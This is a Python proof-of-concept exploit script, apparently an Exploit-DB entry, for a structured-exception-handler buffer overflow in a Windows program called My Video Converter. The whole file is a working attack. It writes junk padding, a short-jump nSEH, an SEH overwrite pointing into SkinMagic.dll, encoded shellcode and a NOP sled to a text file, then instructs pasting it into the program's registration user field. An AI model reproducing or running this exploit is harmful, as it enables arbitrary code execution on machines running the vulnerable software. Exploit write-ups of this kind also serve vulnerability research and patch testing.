from struct import pack

# https://www.exploit-db.com/apps/0c966e74828582db6029aee6dc59bbd5-my_video_converter.exe

name = "exploit.txt"
junk = b"A" * 980

nseh = b"\xeb\x06\x90\x90"

# findjmp.exe SkinMagic.dll esi (/SafeSEH:X  /GS:X  *ASLR64:X  *ASLR:X  SIGNED:X  *DEP:X  NOSEH:X  APPCONTAINER:X  CFG_GUARD:X)
seh = pack("<I",0x10027F8B)

shellcode =  b""
shellcode += b"\xb8\x58\xa5\xe1\x51\xda\xdb\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f"
shellcode += b"\x03\x43\x57\x47\x14\xad\x8f\x05\xd7\x4e\x4f"
shellcode += b"\x6a\x51\xab\x7e\xaa\x05\xbf\xd0\x1a\x4d\xed"
shellcode += b"\xdc\xd1\x03\x06\x57\x97\x8b\x29\xd0\x12\xea"
shellcode += b"\x04\xe1\x0f\xce\x07\x61\x52\x03\xe8\x58\x9d"
shellcode += b"\x56\xe9\x9d\xc0\x9b\xbb\x76\x8e\x0e\x2c\xf3"
shellcode += b"\xda\x92\xc7\x4f\xca\x92\x34\x07\xed\xb3\xea"
shellcode += b"\x1c\xb4\x13\x0c\xf1\xcc\x1d\x16\x16\xe8\xd4"
shellcode += b"\xad\xec\x86\xe6\x67\x3d\x66\x44\x46\xf2\x95"
shellcode += b"\x94\x8e\x34\x46\xe3\xe6\x47\xfb\xf4\x3c\x3a"
shellcode += b"\x27\x70\xa7\x9c\xac\x22\x03\x1d\x60\xb4\xc0"
shellcode += b"\x11\xcd\xb2\x8f\x35\xd0\x17\xa4\x41\x59\x96"
shellcode += b"\x6b\xc0\x19\xbd\xaf\x89\xfa\xdc\xf6\x77\xac"
shellcode += b"\xe1\xe9\xd8\x11\x44\x61\xf4\x46\xf5\x28\x92"
shellcode += b"\x99\x8b\x56\xd0\x9a\x93\x58\x44\xf3\xa2\xd3"
shellcode += b"\x0b\x84\x3a\x36\x68\x7a\x71\x1b\xd8\x13\xdc"
shellcode += b"\xc9\x59\x7e\xdf\x27\x9d\x87\x5c\xc2\x5d\x7c"
shellcode += b"\x7c\xa7\x58\x38\x3a\x5b\x10\x51\xaf\x5b\x87"
shellcode += b"\x52\xfa\x3f\x46\xc1\x66\xee\xed\x61\x0c\xee"

nops = b"\x90" * 50

with open(name, 'wb') as archivo:
    archivo.write(junk + nseh + seh + shellcode + nops)

print(f"{name} file created, paste it in Register > User field!")
